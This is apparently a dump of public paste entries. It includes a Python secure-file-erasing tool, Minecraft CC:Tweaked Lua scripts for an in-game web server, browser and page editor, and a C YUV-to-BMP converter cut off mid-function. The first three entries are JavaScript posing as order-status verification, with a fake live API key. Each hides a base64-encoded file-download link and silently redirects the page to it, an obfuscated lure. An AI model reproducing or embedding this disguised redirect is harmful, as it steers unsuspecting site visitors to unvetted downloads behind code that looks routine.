  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
80G4dBxj,Products.js,jm33,JavaScript,Saturday 5th of April 2025 05:45:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X16718ZD,Order.js,jm33,JavaScript,Saturday 5th of April 2025 05:30:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SUbxsPMx,Secure Eraser.py,nitestryker,Python,Saturday 5th of April 2025 05:08:14 PM CDT," """"""
  Command Guide here ---> https://limewire.com/d/rL4Ai#3jg5yM4lNy 
  © 2025 Nitestryker Software  
  Free to Edit and Distribute but must leave this copyright in place.
 """"""
import os
import random
import subprocess
import platform
import argparse
import shutil
import tempfile
import time
import sys

class SecureEraser:
    """"""
    A comprehensive secure deletion tool that can:
    1. Securely delete individual files
    2. Wipe free space to prevent recovery of previously deleted files
    3. Securely delete entire directories
    4. Wipe entire drives for resale preparation
    """"""
    
    # DoD 5220.22-M standard wipe patterns
    DOD_PATTERNS = [
        b'\x00',                         # Pass 1: All zeros
        b'\xFF',                         # Pass 2: All ones
        b'\x00\xFF\x00\xFF\x00\xFF',     # Pass 3: Alternating bit pattern
        b'\x55\xAA\x55\xAA\x55\xAA',     # Pass 4: Another alternating bit pattern
        b'\x92\x49\x24',                 # Pass 5: Random pattern
        b'\x49\x92\x24\x49\x92',         # Pass 6: Another random pattern
        b'\xDB\xB6\xDB\x6D\xB6\xDB',     # Pass 7: Another random pattern
    ]
    
    # Gutmann 35-pass method patterns (simplified representation)
    GUTMANN_PASSES = 35
    
    def __init__(self, passes=3, method=""standard""):
        """"""
        Initialize with the number of overwrite passes and wiping method.
        
        Args:
            passes: Number of overwrite passes (higher = more secure but slower)
            method: Wiping method - ""standard"", ""dod"", ""gutmann"", or ""paranoid""
                - standard: Uses basic random data (passes parameter determines count)
                - dod: Uses DoD 5220.22-M standard (7 passes minimum)
                - gutmann: Uses Gutmann 35-pass method
                - paranoid: Combines DoD and Gutmann methods plus additional passes
        """"""
        self.method = method.lower()
        
        # Set passes based on method
        if self.method == ""dod"":
            self.passes = max(passes, 7)  # Minimum 7 passes for DoD
        elif self.method == ""gutmann"":
            self.passes = 35  # Always 35 passes for Gutmann
        elif self.method == ""paranoid"":
            self.passes = max(passes, 49)  # DoD + Gutmann + additional
        else:  # standard
            self.passes = passes
            
        self.system = platform.system()
    
    def secure_delete_file(self, file_path):
        """"""
        Securely delete a single file by overwriting it multiple times before deletion.
        Uses the specified wiping method (standard, DoD, Gutmann, or paranoid).
        """"""
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            print(f""File {file_path} does not exist or is not a file."")
            return False
            
        try:
            # Get file size
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            # Skip empty files
            if file_size == 0:
                os.remove(file_path)
                print(f""Empty file {file_name} removed."")
                return True
                
            print(f""Securely wiping {file_name} ({file_size/1024/1024:.2f} MB) with {self.passes} passes"")
            
            # For large files, use a chunked approach with progress reporting
            chunk_size = 1024 * 1024 * 10  # 10MB chunks
            
            # Multiple overwrite passes
            for i in range(self.passes):
                pass_type = ""zeros"" if i == 0 else ""ones"" if i == 1 else f""random data (pass {i+1})""
                print(f""Pass {i+1}/{self.passes}: Writing {pass_type}"")
                
                chunks_total = (file_size + chunk_size - 1) // chunk_size
                chunks_done = 0
                last_percent = -1
                
                with open(file_path, 'wb') as f:
                    remaining_size = file_size
                    
                    while remaining_size > 0:
                        # Determine chunk size for last chunk
                        current_chunk = min(chunk_size, remaining_size)
                        
                        # Generate appropriate data for this pass
                        if i == 0:
                            # Pass 1: zeros
                            data = b'\x00' * current_chunk
                        elif i == 1:
                            # Pass 2: ones
                            data = b'\xFF' * current_chunk
                        else:
                            # Other passes: random data
                            data = bytes(random.getrandbits(8) for _ in range(current_chunk))
                        
                        # Write the chunk
                        f.write(data)
                        
                        # Update progress
                        remaining_size -= current_chunk
                        chunks_done += 1
                        percent = int((chunks_done / chunks_total) * 100)
                        
                        # Only update display when percent changes
                        if percent != last_percent:
                            progress_bar = ""#"" * (percent // 2) + "" "" * (50 - (percent // 2))
                            print(f""Progress: [{progress_bar}] {percent}%"", end=""\r"")
                            last_percent = percent
                            
                            # Flush stdout for real-time updates
                            sys.stdout.flush()
                
                # Ensure data is written to disk
                f.flush()
                os.fsync(f.fileno())
                print()  # New line after progress bar
                    
            # Finally delete the file
            os.remove(file_path)
            print(f""File {file_name} has been securely wiped."")
            return True
        
        except Exception as e:
            print(f""Error wiping file {file_path}: {e}"")
            return False
    
    def secure_delete_directory(self, directory_path):
        """"""
        Securely delete an entire directory and its contents.
        """"""
        if not os.path.exists(directory_path) or not os.path.isdir(directory_path):
            print(f""Directory {directory_path} does not exist or is not a directory."")
            return False
        
        try:
            # Walk through the directory and delete all files securely
            for root, dirs, files in os.walk(directory_path, topdown=False):
                for file in files:
                    self.secure_delete_file(os.path.join(root, file))
                
                # Remove empty directories
                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    if os.path.exists(dir_path):
                        os.rmdir(dir_path)
            
            # Remove the top directory
            os.rmdir(directory_path)
            print(f""Directory {directory_path} has been securely wiped."")
            return True
        
        except Exception as e:
            print(f""Error wiping directory {directory_path}: {e}"")
            return False
    
    def wipe_free_space(self, drive_path):
        """"""
        Wipe free space to prevent recovery of previously deleted files.
        This is the most important function for ensuring already deleted files can't be recovered.
        """"""
        print(f""Wiping free space on {drive_path}..."")
        print(f""Method: {self.method.upper()} with {self.passes} passes"")
        
        # Get available free space to estimate progress
        if self.system == ""Windows"":
            import ctypes
            free_bytes = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, None, ctypes.pointer(free_bytes))
            total_free_space = free_bytes.value
        else:
            # Unix-based systems
            st = os.statvfs(drive_path)
            total_free_space = st.f_bavail * st.f_frsize
        
        print(f""Detected {total_free_space / (1024**3):.2f} GB of free space to wipe"")
        
        # Create a temporary directory on the specified drive
        temp_dir = os.path.join(drive_path, ""temp_secure_wipe"")
        os.makedirs(temp_dir, exist_ok=True)
        
        try:
            # Method: Fill the drive with large files until it's full, then delete them
            large_file_path = os.path.join(temp_dir, ""wipe_file"")
            chunk_size = 1024 * 1024 * 10  # 10MB chunks
            bytes_written = 0
            last_percent = 0
            
            print(""Progress: ["" + "" "" * 50 + ""] 0%"", end=""\r"")
            
            # For each pass
            for current_pass in range(self.passes):
                # Get pattern based on method and current pass
                pattern = self._get_wipe_pattern(current_pass)
                pattern_name = self._get_pattern_name(current_pass)
                
                print(f""\nPass {current_pass+1}/{self.passes}: Writing {pattern_name}"")
                bytes_written = 0
                last_percent = 0
                
                # Create pattern data for this chunk
                pattern_data = self._generate_pattern_data(pattern, chunk_size)
                
                # Write until disk is full
                try:
                    with open(large_file_path, 'wb') as f:
                        while True:
                            f.write(pattern_data)
                            f.flush()
                            os.fsync(f.fileno())
                            
                            # Update progress
                            bytes_written += chunk_size
                            percent = min(100, int((bytes_written / total_free_space) * 100))
                            
                            # Only update display when percent changes to avoid console spam
                            if percent > last_percent:
                                progress_bar = ""#"" * (percent // 2) + "" "" * (50 - (percent // 2))
                                print(f""Progress: [{progress_bar}] {percent}%"", end=""\r"")
                                last_percent = percent
                                
                except IOError:
                    # Expected - disk full
                    print(f""\nPass {current_pass+1}/{self.passes} complete - disk full"")
                
                # Delete the file before next pass
                if os.path.exists(large_file_path):
                    os.remove(large_file_path)
            
            print(""\nFinal cleanup - securely removing wipe file"")
            
            # Clean up
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f""Complete! Free space on {drive_path} has been wiped with {self.passes} passes using {self.method.upper()} method."")
            return True
        
        except Exception as e:
            print(f""\nError wiping free space on {drive_path}: {e}"")
            # Clean up in case of error
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
            return False
    
    def _get_wipe_pattern(self, pass_number):
        """"""Get the appropriate pattern for the current pass based on wiping method.""""""
        if self.method == ""dod"":
            # DoD 5220.22-M method
            pattern_index = min(pass_number, len(self.DOD_PATTERNS) - 1)
            return self.DOD_PATTERNS[pattern_index]
        elif self.method == ""gutmann"" or self.method == ""paranoid"":
            # Gutmann method patterns (simplified)
            if pass_number < 4:
                # Passes 1-4: Random data
                return None  # Signal to use random data
            elif pass_number < 10:
                # Passes 5-10: Specific patterns from DoD
                dod_index = (pass_number - 4) % len(self.DOD_PATTERNS)
                return self.DOD_PATTERNS[dod_index]
            elif pass_number < 32:
                # Passes 11-32: Specific bit patterns (simplified to random)
                return None  # Signal to use random data
            else:
                # Passes 33-35: Random data again
                return None  # Signal to use random data
        else:
            # Standard method
            if pass_number == 0:
                return b'\x00'  # First pass: zeros
            elif pass_number == 1:
                return b'\xFF'  # Second pass: ones
            else:
                return None  # Other passes: random data
    
    def _get_pattern_name(self, pass_number):
        """"""Get a human-readable name for the current pass pattern.""""""
        pattern = self._get_wipe_pattern(pass_number)
        
        if pattern is None:
            return f""random data""
        elif pattern == b'\x00':
            return ""zeros (0x00)""
        elif pattern == b'\xFF':
            return ""ones (0xFF)""
        elif pattern == b'\x00\xFF\x00\xFF\x00\xFF':
            return ""alternating zeros and ones""
        elif pattern == b'\x55\xAA\x55\xAA\x55\xAA':
            return ""alternating 01010101 and 10101010""
        elif pattern == b'\x92\x49\x24':
            return ""DoD pattern 10010010...""
        elif pattern == b'\x49\x92\x24\x49\x92':
            return ""DoD pattern 01001001...""
        elif pattern == b'\xDB\xB6\xDB\x6D\xB6\xDB':
            return ""DoD pattern 11011011...""
        else:
            return f""special pattern {pattern[:10].hex()}...""
    
    def _generate_pattern_data(self, pattern, chunk_size):
        """"""Generate a chunk of data using the specified pattern or random data if pattern is None.""""""
        if pattern is None:
            # Random data
            return bytes(random.getrandbits(8) for _ in range(chunk_size))
        else:
            # Repeat the pattern to fill the chunk
            pattern_length = len(pattern)
            repeats = chunk_size // pattern_length
            remainder = chunk_size % pattern_length
            
            return pattern * repeats + pattern[:remainder]
    
    def wipe_free_space_advanced(self, drive_path):
        """"""
        Use platform-specific tools for more thorough free space wiping.
        This is a more advanced option that uses built-in OS tools where available.
        """"""
        if self.system == ""Windows"":
            return self._wipe_free_space_windows(drive_path)
        elif self.system == ""Darwin"":  # macOS
            return self._wipe_free_space_macos(drive_path)
        else:  # Linux and other UNIX-like systems
            return self._wipe_free_space_linux(drive_path)
    
    def _wipe_free_space_windows(self, drive_path):
        """"""
        Use sdelete from Sysinternals to wipe free space on Windows.
        Note: sdelete must be installed and in the system PATH.
        """"""
        try:
            # Check if sdelete is available
            subprocess.run(['sdelete', '-?'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            # Run sdelete to clean free space with progress monitoring
            print(f""Using sdelete to wipe free space on {drive_path}..."")
            
            # Configure sdelete based on passes
            if self.passes <= 1:
                # Single pass of zeros
                args = ['sdelete', '-z', '-nobanner', drive_path]
            else:
                # Multiple passes (sdelete uses 3 passes with -p)
                args = ['sdelete', '-p', str(min(self.passes, 3)), '-nobanner', drive_path]
            
            print(f""Starting {self.passes} pass(es) with sdelete - This may take a while"")
            print(""Progress indicator from sdelete:"")
            
            # Run sdelete with real-time output
            process = subprocess.Popen(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            
            # Show real-time progress from sdelete
            for line in process.stdout:
                line = line.strip()
                if line:
                    print(f""  {line}"")
            
            # Wait for process to complete
            return_code = process.wait()
            
            if return_code == 0:
                print(f""Free space on {drive_path} has been wiped using sdelete."")
                return True
            else:
                raise subprocess.CalledProcessError(return_code, args)
        
        except FileNotFoundError:
            print(""sdelete not found. Please install SysInternals Suite from Microsoft."")
            print(""Falling back to basic free space wiping method..."")
            return self.wipe_free_space(drive_path)
        
        except subprocess.CalledProcessError as e:
            print(f""Error running sdelete: {e}"")
            print(""Falling back to basic free space wiping method..."")
            return self.wipe_free_space(drive_path)
    
    def _wipe_free_space_macos(self, drive_path):
        """"""
        Use diskutil to wipe free space on macOS.
        """"""
        try:
            # Get the disk identifier for the given path
            df_output = subprocess.check_output(['df', drive_path]).decode('utf-8').strip().split('\n')
            disk_id = df_output[1].split()[0]
            
            print(f""Using diskutil to wipe free space on {disk_id}..."")
            
            # Use diskutil to securely erase free space
            # 1 pass for speed, but can be increased for more security
            subprocess.run(['diskutil', 'secureErase', 'freespace', str(self.passes), disk_id], check=True)
            
            print(f""Free space on {drive_path} ({disk_id}) has been wiped using diskutil."")
            return True
        
        except Exception as e:
            print(f""Error using diskutil to wipe free space: {e}"")
            print(""Falling back to basic free space wiping method..."")
            return self.wipe_free_space(drive_path)
    
    def _wipe_free_space_linux(self, drive_path):
        """"""
        Use secure-delete tools (if available) or fallback to manual method on Linux.
        """"""
        try:
            # Check if sfill (part of secure-delete) is available
            subprocess.run(['sfill', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            print(f""Using sfill to wipe free space on {drive_path}..."")
            
            # Use sfill to securely erase free space
            # -l option makes it less secure but faster
            subprocess.run(['sfill', '-l', '-v', drive_path], check=True)
            
            print(f""Free space on {drive_path} has been wiped using sfill."")
            return True
        
        except FileNotFoundError:
            print(""sfill not found. Please install the secure-delete package."")
            print(""Falling back to basic free space wiping method..."")
            return self.wipe_free_space(drive_path)
        
        except subprocess.CalledProcessError as e:
            print(f""Error running sfill: {e}"")
            print(""Falling back to basic free space wiping method..."")
            return self.wipe_free_space(drive_path)


def main():
    parser = argparse.ArgumentParser(description='Securely wipe files, directories, and free space for safe computer resale.')
    
    # Create subparsers for different commands
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Parser for the file command
    file_parser = subparsers.add_parser('file', help='Securely delete a file')
    file_parser.add_argument('path', help='Path to the file')
    file_parser.add_argument('--passes', type=int, default=3, help='Number of overwrite passes (default: 3)')
    file_parser.add_argument('--method', choices=['standard', 'dod', 'gutmann', 'paranoid'], default='standard',
                          help='Wiping method: standard, dod (DoD 5220.22-M), gutmann (35-pass), or paranoid (default: standard)')
    
    # Parser for the directory command
    dir_parser = subparsers.add_parser('directory', help='Securely delete a directory')
    dir_parser.add_argument('path', help='Path to the directory')
    dir_parser.add_argument('--passes', type=int, default=3, help='Number of overwrite passes (default: 3)')
    dir_parser.add_argument('--method', choices=['standard', 'dod', 'gutmann', 'paranoid'], default='standard',
                          help='Wiping method: standard, dod (DoD 5220.22-M), gutmann (35-pass), or paranoid (default: standard)')
    
    # Parser for the freespace command
    free_parser = subparsers.add_parser('freespace', help='Wipe free space to prevent recovery of previously deleted files')
    free_parser.add_argument('path', help='Path to the drive/partition')
    free_parser.add_argument('--advanced', action='store_true', help='Use advanced OS-specific methods if available')
    free_parser.add_argument('--passes', type=int, default=3, help='Number of overwrite passes (default: 3)')
    free_parser.add_argument('--method', choices=['standard', 'dod', 'gutmann', 'paranoid'], default='standard',
                          help='Wiping method: standard, dod (DoD 5220.22-M), gutmann (35-pass), or paranoid (default: standard)')
    
    # Parser for fullwipe command - new command for computer resale preparation
    fullwipe_parser = subparsers.add_parser('fullwipe', help='Complete system wipe for computer resale (WARNING: destroys all data)')
    fullwipe_parser.add_argument('drive', help='Drive to wipe (e.g., C:, /dev/sda)')
    fullwipe_parser.add_argument('--method', choices=['standard', 'dod', 'gutmann', 'paranoid'], default='dod',
                          help='Wiping method: standard, dod (DoD 5220.22-M), gutmann (35-pass), or paranoid (default: dod)')
    fullwipe_parser.add_argument('--passes', type=int, default=7, help='Number of overwrite passes (default: 7)')
    fullwipe_parser.add_argument('--force', action='store_true', help='Skip confirmation prompt (USE WITH CAUTION)')
    
    args = parser.parse_args()
    
    # Create the secure eraser
    eraser = SecureEraser(passes=args.passes)
    
    # Execute the requested command
    if args.command == 'file':
        eraser = SecureEraser(passes=args.passes, method=args.method)
        eraser.secure_delete_file(args.path)
    elif args.command == 'directory':
        eraser = SecureEraser(passes=args.passes, method=args.method)
        eraser.secure_delete_directory(args.path)
    elif args.command == 'freespace':
        eraser = SecureEraser(passes=args.passes, method=args.method)
        if args.advanced:
            eraser.wipe_free_space_advanced(args.path)
        else:
            eraser.wipe_free_space(args.path)
    elif args.command == 'fullwipe':
        # Special handling for full drive wiping (computer resale preparation)
        print(""\n"" + ""=""*80)
        print(""WARNING: FULL DRIVE WIPE REQUESTED"".center(80))
        print(""This will PERMANENTLY DESTROY ALL DATA on the drive!"".center(80))
        print(""Intended for computer resale preparation."".center(80))
        print(""=""*80 + ""\n"")
        
        if not args.force:
            confirmation = input(f""Are you ABSOLUTELY SURE you want to wipe ALL DATA on {args.drive}? (yes/NO): "")
            if confirmation.lower() != ""yes"":
                print(""Operation canceled. No data was modified."")
                return
                
            confirmation2 = input(f""FINAL WARNING: Type 'I UNDERSTAND THIS DESTROYS ALL DATA' to confirm: "")
            if confirmation2 != ""I UNDERSTAND THIS DESTROYS ALL DATA"":
                print(""Operation canceled. No data was modified."")
                return
        
        print(f""\nInitiating full drive wipe on {args.drive} using {args.method.upper()} method with {args.passes} passes"")
        print(""This process may take several hours to several days depending on drive size and method."")
        
        # TODO: Implement actual drive wiping using platform-specific tools
        # For now we'll just show a message about the appropriate tool to use
        if platform.system() == ""Windows"":
            print(""\nFor Windows systems, please use DBAN (Darik's Boot and Nuke) for full drive wiping."")
            print(""Download DBAN from https://dban.org/"")
            print(""Create a bootable USB/DVD and boot from it to wipe the entire drive."")
        elif platform.system() == ""Darwin"":  # macOS
            print(""\nFor macOS, please use Disk Utility's secure erase feature:"")
            print(""1. Open Disk Utility"")
            print(""2. Select the drive"")
            print(""3. Click 'Erase'"")
            print(""4. Click 'Security Options' and choose the appropriate wiping level"")
        else:  # Linux
            print(""\nFor Linux, you can use the 'shred' command for full drive wiping:"")
            print(f""sudo shred -v -n {args.passes} -z {args.drive}"")
            
        print(""\nRecommendation: For the most thorough wipe for computer resale, use dedicated"")
        print(""wiping tools that can create a verification report, such as:"")
        print(""- DBAN (Darik's Boot and Nuke)"")
        print(""- Blancco Drive Eraser"")
        print(""- KillDisk"")
    else:
        parser.print_help()


if __name__ == ""__main__"":
    main()

"
WNtwKkmM,Web-server.lua,ccraftersanonmoose,Lua,Saturday 5th of April 2025 04:51:43 PM CDT,"-- /startup on the Page Server
-- Script to allow serving of ""websites"" in game with CC:tweaked
-- Should only be used on a ""webserver""
-- Make sure advanced raid is attached and has disks in it
-- Intended to be used in conjunction with other scripts at links below
-- Website Editor: https://pastebin.com/xZpzw5Vt
-- Web Browser: https://pastebin.com/6Qt1U5RF
------------------------------
local drive = peripheral.find(""raid"") or error(""RAID drive not found"")
local modem = peripheral.find(""modem"") or error(""Modem not found"")
rednet.open(peripheral.getName(modem))
local SERVER_ID = os.getComputerID()

print(""Page Server "" .. SERVER_ID .. "" online."")

while true do
  local sender, message = rednet.receive()
  if type(message) == ""table"" and message.type == ""request_page"" then
    local pagePath = ""/pages/"" .. message.page .. "".page""
    if drive and drive.hasData and fs.exists(pagePath) then
      local file = fs.open(pagePath, ""r"")
      local content = file.readAll()
      file.close()
      rednet.send(sender, {type = ""page_data"", page = message.page, content = content})
    else
      rednet.send(sender, {type = ""error"", error = ""Page not found.""})
    end
  end
end"
6Qt1U5RF,Web-browser.lua,ccraftersanonmoose,Lua,Saturday 5th of April 2025 04:50:26 PM CDT,"-- Script to allow browsing of ""websites"" in game with CC:tweaked
-- Should only be used on a ""client""
-- Make sure advanced montior is attached
-- Touch navigation supported
-- Scrollable websites to come as well as ""search engine""
-- Intended to be used in conjunction with other scripts at links below
-- Website Editor: https://pastebin.com/xZpzw5Vt
-- Web Server: https://pastebin.com/WNtwKkmM
------------------------------
local monitor = peripheral.find(""monitor"")
monitor.setTextScale(0.5)
local modem = peripheral.find(""modem"") or error(""Modem not found"")
rednet.open(peripheral.getName(modem))

-- List of known page server IDs
local pageServers = {1, 2, 3}  -- Change this to match your server IDs

local currentPage = ""home""
local history = {}

-- Custom word-wrap function (replaces textutils.wrap)
local function wrapText(text, width)
  local lines = {}
  for line in text:gmatch(""[^\n]+"") do
    while #line > width do
      local cutoff = line:sub(1, width):match("".*() "") or width
      table.insert(lines, line:sub(1, cutoff))
      line = line:sub(cutoff + 1)
    end
    table.insert(lines, line)
  end
  return lines
end

-- Request a page from the first responding server
local function requestPage(page)
  for _, server in ipairs(pageServers) do
    rednet.send(server, {type = ""request_page"", page = page})
    local id, response, _ = rednet.receive(2) -- wait 2s
    if response and response.type == ""page_data"" then
      return textutils.unserialize(response.content)
    end
  end
  return {title = ""Error"", body = ""Page not found."", links = {}}
end

-- Draw the page on the monitor
local function drawPage(data)
  monitor.clear()
  monitor.setCursorPos(1, 1)
  monitor.setTextColor(colors.yellow)
  monitor.write(data.title or ""Untitled"")

  monitor.setCursorPos(1, 3)
  monitor.setTextColor(colors.white)
  local lines = wrapText(data.body or """", 38)
  for i, line in ipairs(lines) do
    monitor.setCursorPos(1, 2 + i)
    monitor.write(line)
  end

  -- Draw links
  local linkY = 3 + #lines + 1
  for i, link in ipairs(data.links or {}) do
    monitor.setCursorPos(2, linkY)
    monitor.setTextColor(colors.cyan)
    monitor.write(""["" .. link.text .. ""]"")
    link.y = linkY
    linkY = linkY + 1
  end

  return data.links
end

-- Helper to check which link was tapped
local function getLinkAtY(links, y)
  for _, link in ipairs(links) do
    if y == link.y then
      return link.page
    end
  end
end

-- Main browser loop
while true do
  local pageData = requestPage(currentPage)
  local links = drawPage(pageData)

  local event, side, x, y = os.pullEvent(""monitor_touch"")
  local target = getLinkAtY(links, y)
  if target then
    table.insert(history, currentPage)
    currentPage = target
  end
end"
xZpzw5Vt,Editor.lua,ccraftersanonmoose,Lua,Saturday 5th of April 2025 04:46:53 PM CDT,"-- /page_editor.lua
-- Script to allow creation of ""websites"" in game with CC:tweaked
-- Should only be used on a ""webserver""
-- Make sure advanced raid is attached and has disks in it
-- Intended to be used in conjunction with other scripts at links below
-- Webserver: https://pastebin.com/WNtwKkmM
-- Web Browser: https://pastebin.com/6Qt1U5RF

----------------------------
local function prompt(label)
  term.write(label .. "": "")
  return read()
end

local function editPage()
  term.clear()
  term.setCursorPos(1, 1)

  print(""== Web Page Editor =="")
  local filename = prompt(""Page name (no extension)"")
  local title = prompt(""Page title"")
  
  print(""Enter page body (end with a blank line):"")
  local bodyLines = {}
  while true do
    local line = read()
    if line == """" then break end
    table.insert(bodyLines, line)
  end
  local body = table.concat(bodyLines, ""\n"")

  local links = {}
  while true do
    local linkText = prompt(""Link text (blank to stop)"")
    if linkText == """" then break end
    local linkTarget = prompt(""Target page name"")
    table.insert(links, { text = linkText, page = linkTarget })
  end

  local data = {
    title = title,
    body = body,
    links = links
  }

  local savePath = ""/pages/"" .. filename .. "".page""
  if not fs.exists(""/pages"") then fs.makeDir(""/pages"") end
  local file = fs.open(savePath, ""w"")
  file.write(textutils.serialize(data))
  file.close()

  print(""\nSaved to "" .. savePath)
end

editPage()"
AGcQVNmB,YUV2BMP,panda_200,C++,Saturday 5th of April 2025 04:46:50 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include ""bmp.h""
typedef unsigned char uchar;


typedef struct {
    int y, u, v;
} YUV;

int ch_round(int v) {
    if (v < 0) return 0;
    if (v > 255) return 255;
    return v;
}


BGR yuv2rgb(YUV yuv) {
    BGR rgb;
    rgb.r = ch_round(yuv.y + 1.402 * (yuv.v - 128));
    rgb.g = ch_round(yuv.y - 0.344136 * (yuv.u - 128) - 0.714136 * (yuv.v - 128));
    rgb.b = ch_round(yuv.y + 1.772 * (yuv.u - 128));
    return rgb;
}


uchar *read_bytes(FILE *in, int count) {
    uchar *input = malloc(count * sizeof(uchar));
    if (input == NULL) {
        printf(""Memory allocation failed\n"");
        return NULL;
    }
    size_t read_count = fread(input, sizeof(uchar), count, in);
    if (read_count != count) {
        printf(""Read %zu elements, expected %d\n"", read_count, count);
        return NULL;
    }
    return input;
}

uchar **read_yuv_image(FILE *in, int count, int stride) {
    uchar *luminance = read_bytes(in, count);
    uchar *blue = read_bytes(in, count / (stride * stride));
    uchar *red = read_bytes(in, count / (stride * stride));

    if (luminance && blue && red) {
        printf(""Data read successfully\n"");
    } else {
        free(luminance);
        free(blue);
        free(red);
        return NULL;
    }
    uchar **data = malloc(3 * sizeof(uchar *));
    data[0] = luminance;
    data[1] = blue;
    data[2] = red;
    return data;
}

// covert
BGR **transform(uchar *luminance, uchar *blue, uchar *red, int height, int width, int stride,
                int gray_scale, int up_size, int down_size) {
    int new_height = height * up_size / down_size;
    int new_width = width * up_size / down_size;
    printf(""new_height = %d, new_width = %d\n"", new_height, new_width);

    BGR **data = malloc(height * sizeof(BGR *));
    for (int i = 0; i < height; i++) {
        data[i] = (BGR *) malloc(width * sizeof(BGR));
    }

    if (!data) {
        fprintf(stderr, ""Memory allocation failed!\n"");
        exit(1);
    }


    for (int i = 0; i < height; i++) {
        for (int j = 0; j < width; j++) {
            if (gray_scale) {
                BGR rgb = {luminance[i * width + j], luminance[i * width + j], luminance[i * width + j]};
                data[i][j] = rgb;
            } else {
                int group_id = (i / stride) * (width / stride) + j / stride;
                YUV yuv = {luminance[i * width + j], blue[group_id], red[group_id]};
                BGR rgb = yuv2rgb(yuv);
                data[i][j] = rgb;
            }
        }
    }
    printf(""from yuv to rgb\n"");
    // rescale
    BGR **scaled_data = malloc(new_height * sizeof(BGR *));
    for (int i = 0; i < new_height; i++) {
        scaled_data[i] = (BGR *) malloc(new_width * sizeof(BGR));
    }

    if (!scaled_data) {
        free(data);
        fprintf(stderr, ""Memory allocation failed!\n"");
        exit(1);
    }


    for (int i = 0; i < new_height; i++) {
        for (int j = 0; j < new_width; j++) {
            int old_i = i * down_size / up_size;
            int old_j = j * down_size / up_size;
            if (old_i >= height) {
                old_i = height - 1;
            }
            if (old_j >= width) {
                old_j = width - 1;
            }
            scaled_data[i][j] = data[old_i][old_j];
        }
    }
    printf(""scaled data\n"");
    return scaled_data;
}


void YUV2BMP(FILE *in, FILE *out, int height, int width, int stride, int gray_scale, int up_size, int down_size) {
    printf(""up_size = %d, down_size = %d\n"", up_size, down_size);
    int count = height * width;
    uchar **data = read_yuv_image(in, count, stride);
    if (data == NULL) {
        printf(""Data read failed\n"");
        return;
    }

    uchar *luminance = data[0];
    uchar *blue = data[1];
    uchar *red = data[2];

    int new_height = height * up_size / down_size;
    int new_width = width * up_size / down_size;
    BMP_Header *bmp_header = malloc(sizeof(BMP_Header));
    fill_bmp_header(bmp_header, new_height, new_width, 24);
    fwrite(bmp_header, sizeof(BMP_Header), 1, out);

